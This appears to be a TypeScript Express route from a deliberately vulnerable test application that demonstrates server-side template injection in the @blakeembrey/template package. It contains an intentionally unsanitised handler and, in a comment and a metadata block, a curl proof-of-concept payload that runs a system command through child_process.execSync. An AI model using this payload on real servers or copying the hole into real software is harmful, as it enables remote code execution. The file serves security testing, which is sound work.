import { Request, Response } from 'express';
import { template } from '@blakeembrey/template';

interface RequestBody {
  template: string;
  name: string;
}

/**
curl -X POST -H "Content-Type: application/json" -d '{"template":"Hello {{name}}!", "name":"x() {} && ((()=>{ return process.mainModule.require('\''child_process'\'').execSync('\''calc.exe'\'') })()) && function x"}' http://localhost:8091/code-injection/blakeembrey-template
*/
export default function blakeembreyTemplateHandler(req: Request, res: Response): void {
  const { template: templateString, name } = req.body as RequestBody;

  try {
    //$_1_START_OF_VULNERABILITY_CODE_SNIPPET
    //$        <FileName>BlakeembreyTemplate_1_1_0.js</FileName>
    //$        <Category>ssti</Category>
    //$        <Platform>Node.js</Platform>
    //$        <VulnerabilityType>Template Injection</VulnerabilityType>
    //$        <RelURL>/code-injection/blakeembrey-template</RelURL>
    //$        <Description>
    //$        The @blakeembrey/template package is vulnerable to template injection attacks.
    //$        The template engine evaluates user input as JavaScript code without proper sanitization,
    //$        allowing attackers to execute arbitrary code on the server.
    //$        </Description>
    //$        <Impact>
    //$        An attacker can execute arbitrary system commands through template injection,
    //$        potentially leading to remote code execution (RCE) on the server.
    //$        </Impact>
    //$        <POCHint>
    //$        Send a POST request with JSON payload:
    //$        {
    //$          "template": "Hello {{name}}!",
    //$          "name": "x() {} && ((()=>{ return global.process.mainModule.require('child_process').execSync('calc.exe') })()) && function x"
    //$        }
    //$        This will execute the calculator on Windows systems.
    //$        </POCHint>
    //$        <ManualVerified>true</ManualVerified>
    //$_2_END_OF_VULNERABILITY_CODE_SNIPPET  : line numbers and </Testcase> will be appended by scripts
    const rendered = template(templateString, name);
    //$_3_END_OF_VULNERABILITY_CODE_SNIPPET
    res.send(rendered);
  } catch (error) {
    res.status(500).send((error as Error).message);
  }
} 